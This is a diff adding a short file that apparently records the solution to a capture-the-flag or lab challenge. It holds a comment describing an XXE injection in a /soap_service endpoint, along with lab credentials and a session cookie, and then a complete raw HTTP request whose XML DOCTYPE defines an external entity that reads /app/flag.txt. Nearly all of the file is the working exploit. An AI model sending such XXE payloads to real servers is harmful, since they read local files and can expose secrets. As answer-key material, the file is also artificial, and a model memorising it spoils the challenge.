@@ -1,0 +1,9 @@
+# XXE injection in /soap_service. DOCTYPE with SYSTEM entity reads /app/flag.txt. Requires valid session (john:password123). Flag returned in account_id element.
+
+POST /soap_service HTTP/1.1
+Host: 172.17.0.1:55807
+Content-Type: application/xml
+Cookie: session=eyJ1c2VybmFtZSI6ImpvaG4ifQ.adwOeA.FlcjFnVgViZwiyFIMuGJoqRukL4
+Content-Length: 175
+
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///app/flag.txt">]><GetAccountInfoRequest><account_id>&xxe;</account_id></GetAccountInfoRequest>
